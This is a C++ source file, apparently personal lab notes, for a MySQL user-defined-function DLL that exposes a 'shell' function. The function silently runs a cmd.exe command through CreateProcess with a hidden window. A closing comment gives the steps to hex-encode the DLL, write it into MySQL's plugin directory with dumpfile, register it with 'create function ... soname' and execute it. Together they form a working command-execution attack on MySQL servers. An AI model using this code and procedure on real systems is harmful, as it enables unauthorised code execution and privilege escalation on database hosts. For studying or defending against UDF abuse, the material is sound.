// MYSQL-UDF-DLL调用简单命令.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

#include <iostream>
#include <mysql.h>
#include <Windows.h>

//目前写死
wchar_t cmd[] = LR"(cmd.exe /c ipconfig > C:\Users\who\Desktop\mysql\123.txt)";
//设置args->args[0]的参数,达到动态修改命令

extern "C" {
    __declspec(dllexport) char* shell(
        UDF_INIT* initid,
        UDF_ARGS* args,
        char* result,
        unsigned long* length,
        char* is_null,
        char* error);
    __declspec(dllexport) my_bool shell_init(
        UDF_INIT* initid,
        UDF_ARGS* args,
        char* message);
}


void mycmd(wchar_t cmd[]) {
    STARTUPINFO si{ sizeof(STARTUPINFO) };
    PROCESS_INFORMATION pi;
    CreateProcess(
        NULL,           // 不指定可执行文件路径（直接用 cmd）
        cmd,            // 命令行参数（/c 表示执行后关闭）， 要求是能修改的字符串
        NULL,           // 进程句柄不可继承
        NULL,           // 线程句柄不可继承
        FALSE,          // 不继承句柄
        CREATE_NO_WINDOW, // 不显示控制台窗口（静默运行）
        NULL,           // 使用当前环境变量
        NULL,           // 使用当前工作目录
        &si,            // 启动信息
        &pi             // 进程信息
    );

    // 关闭句柄（避免资源泄漏）
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

int main()
{
    //调用
    //mycmd(cmd);
}

//用户函数
char* shell(
    UDF_INIT* initid,
    UDF_ARGS* args,
    char* result,
    unsigned long* length,
    char* is_null,
    char* error){

    //判断参数只能为一个
    if (args->arg_count != 1) {
        *is_null = 1;
        return NULL;
    }
    mycmd(cmd);
    MessageBox(NULL,L"text1",L"text2", 0);


    return result;
}

//初始函数
my_bool shell_init(
    UDF_INIT* initid,
    UDF_ARGS* args,
    char* message) {

    return 0;

}

/*
1.createprocess创一个线程
2.将代码转成dll
3.把dll导入mysql
4.在mysql里面执行 函数，达到执行线程的目的

A.mysql转把dll转16进制
B.mySQL把dll写到lib/plugin目录, 进而实现定制dll

如何传自已的dll, -->前提是权限很大，配置文件相应配置
1.首先本地写好dll
2.把dll转成16进制
3.利用dumpfile(不要用outfile)写上去
4.create function test returns string soname 'dll.dll';
4.select test('test');执行

*/